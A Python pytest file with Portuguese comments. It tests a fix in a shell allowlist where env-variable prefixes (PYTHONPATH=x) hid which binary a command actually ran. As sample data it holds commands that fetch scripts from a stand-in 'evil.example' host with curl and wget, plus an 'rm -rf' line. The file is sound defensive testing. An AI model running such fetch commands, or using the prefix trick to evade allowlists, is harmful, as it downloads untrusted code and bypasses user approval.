"""Atribuição de variável no início do comando não pode virar o "comando".

`VAR=valor cmd ...` é sintaxe de shell — as atribuições vêm ANTES do binário.
O `_check_allowlist` tomava `args[0]` cru, então:

    PYTHONPATH=x python -m pytest        -> base 'pythonpath=x'
    PYTHONPATH=x curl http://evil/x.sh   -> base 'pythonpath=x'   ← MESMO base

Isso é bypass, não cosmético: uma vez que o usuário aprovasse o primeiro com
"sempre", o segundo passava sem perguntar. Encontrado numa allowlist real, com
`pythonpath=forex-ai-war-room` já gravada em ~/.bauer/allowed_commands.yaml.
"""

from __future__ import annotations

import shlex
from pathlib import Path

import pytest

from bauer.shell_runner import BlockedCommandError, ShellRunner


def _base(cmd: str) -> str:
    return ShellRunner._base_command(shlex.split(cmd))


# ─── extração do binário ─────────────────────────────────────────────────────


@pytest.mark.parametrize("cmd,esperado", [
    ("docker ps", "docker"),
    ("PYTHONPATH=x python -m pytest", "python"),
    ("FOO=1 BAR=2 rm -rf /tmp/alvo", "rm"),
    ("LC_ALL=C git status", "git"),
    ("/usr/bin/docker ps", "docker"),
    ("NODE_ENV=production npm run build", "npm"),
])
def test_base_ignora_atribuicoes(cmd, esperado):
    assert _base(cmd) == esperado


def test_comandos_diferentes_nao_compartilham_base():
    """O coração do bug: dois comandos distintos viravam a mesma entrada."""
    a = _base("PYTHONPATH=forex-ai-war-room python -m pytest")
    b = _base("PYTHONPATH=forex-ai-war-room curl http://evil.example/x.sh")
    assert a == "python" and b == "curl"
    assert a != b, "aprovar um liberaria o outro"


def test_so_atribuicoes_nao_vira_comando():
    """`A=1` sozinho não tem binário — não há o que permitir."""
    assert _base("A=1") == ""


def test_valor_com_igual_nao_confunde():
    """`URL=http://x?a=b cmd` — o valor tem '=' e não pode quebrar a deteção."""
    assert _base("URL=http://x?a=b curl http://x") == "curl"


def test_nao_confunde_flag_com_atribuicao():
    """`--opt=valor` NÃO é atribuição de env — não pode ser PULADO.

    O regex exige nome de variável de shell (letra/_ no início), então `--x=1`
    não casa e o token continua sendo tratado como o comando. O valor exato
    aqui é o token cru: `Path("--weird=1").stem` não tem extensão para tirar.
    """
    assert _base("--weird=1") == "--weird=1"


def test_atribuicao_exige_nome_de_variavel_valido():
    """Só `NOME=` no formato de variável de shell é pulado."""
    assert _base("1FOO=x cmd") == "1foo=x"   # começa com dígito → não é variável
    assert _base("FOO=x cmd") == "cmd"       # válido → pulado


# ─── efeito real na allowlist ────────────────────────────────────────────────


def _runner(tmp_path, permitidos):
    return ShellRunner(workspace=tmp_path, extra_allowed_commands=list(permitidos))


def test_prefixo_env_nao_libera_binario_diferente(tmp_path):
    """Cenário exato do bypass: `python` permitido, `curl` não."""
    sr = _runner(tmp_path, ["python"])

    sr.validate("PYTHONPATH=proj python -m pytest")  # permitido: base é python

    with pytest.raises(BlockedCommandError):
        sr.validate("PYTHONPATH=proj curl http://evil.example/x.sh")


def test_atribuicao_nao_esconde_binario_bloqueado(tmp_path):
    """Prefixar com env não pode servir de disfarce para binário fora da lista."""
    sr = _runner(tmp_path, ["docker"])
    with pytest.raises(BlockedCommandError):
        sr.validate("FOO=1 wget http://evil.example/x")


def test_binario_permitido_continua_funcionando(tmp_path):
    """Regressão: o caminho normal não pode ter quebrado."""
    sr = _runner(tmp_path, ["docker"])
    args = sr.validate("docker ps")
    assert args[0] == "docker"
